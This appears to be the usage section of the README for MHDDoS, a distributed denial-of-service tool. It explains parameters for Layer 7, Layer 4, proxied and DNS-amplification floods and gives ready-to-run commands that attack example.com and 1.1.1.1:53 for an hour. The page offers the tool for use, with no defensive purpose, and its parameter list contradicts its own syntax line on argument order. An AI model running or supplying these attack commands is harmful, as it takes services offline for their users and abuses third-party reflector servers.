## Parameters
* Layer7:
   > python3 start.py <1=method> <2=url> <3=socks_type> <4=threads> <5=proxylist> <6=rpc> <7=duration> <8=debug=optional>
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Proxy Version ([Proxy Usage](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Support-!))
  - 4: Proxy File ([Proxy File Format](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Files))
  - 5: Number of threads to use ([Multi Threading](https://en.wikipedia.org/wiki/Multithreading_(computer_architecture)))
  - 6: RPC (Requests pre connection)
  - 7: Duration (Time to finish attack in seconds)
  - 8: Debug Mode (Optional)

* Layer4 Normal:
  > python3 start.py <1=method> <2=ip:port> <3=threads> <4=duration> <5=debug=optional>
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://en.wikipedia.org/wiki/Multithreading_(computer_architecture)))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Debug Mode (Optional - [What is debug mode](https://github.com/MHProDev/MHDDoS/wiki/what-is-debug-mode))

* Layer4 Proxied:
  > python3 start.py <1=method> <2=ip:port> <3=threads> <4=duration> <5=socks_type> <6=proxylist> <7=debug=optional>
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://github.com/MHProDev/MHDDoS/wiki/Multithreading))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Proxy Version ([Proxy Usage](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Support-!))
  - 6: Proxy File ([Proxy File Format](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Files))
  - 7: Debug Mode (Optional)

* Layer4 Amplification:
  > python3 MHDDoS/start.py <1=method> <2=ip:port> <3=threads> <4=duration> <5=refelector file> <6=debug=optional>
  - 1: Method (type of attack)
  - 2: Target URL or IP Address
  - 3: Number of threads to use ([Multi Threading](https://en.wikipedia.org/wiki/Multithreading_(computer_architecture)))
  - 4: Duration (Time to finish attack in seconds)
  - 5: Reflectors File ([Reflectors File](https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack))
  - 6: Debug Mode (Optional)


## Examples
* Layer7 (Website):
```shell script
# Running bypass attack from 101 threads, 
# with socks 5, 100 requests per proxy (connection), for 3600 seconds  
python start.py bypass https://example.com 5 101 socks5.txt 100 3600
# Running bomb attack from 50 threads (be careful must be < 300)
# with all proxies (0), 100 requests per proxy (connection), for 3600 seconds
python start.py bomb https://example.com 0 50 proxy.txt 100 3600
```

* Layer4 (Server/Home):
```shell script
# Running udp attack from 1 threads, for 3600 seconds  
python start.py udp 1.1.1.1:53 1 3600
# Running dns attack from 100 threads, for 3600 seconds  
# with reflector servers from dns.txt, for 3600 seconds  
python start.py dns 1.1.1.1:53 100 3600 dns.txt
# Running minecraft attack from 1000 threads
# with socks 5, for 3600 seconds  
python start.py minecraft 1.1.1.1:53 1000 3600 5 socks5.txt
```

* Debug Mode (Log Attack status):
```shell script
python start.py bypass https://example.com 5 1000 socks5.txt 100 100 true
python start.py udp 1.1.1.1:53 1 100 true
python start.py dns 1.1.1.1:53 1 100 dns.txt true
python start.py minecraft 1.1.1.1:53 1 100 5 socks5.txt true
```

* Tools/Help:
```shell script
python start.py tools
python start.py help
```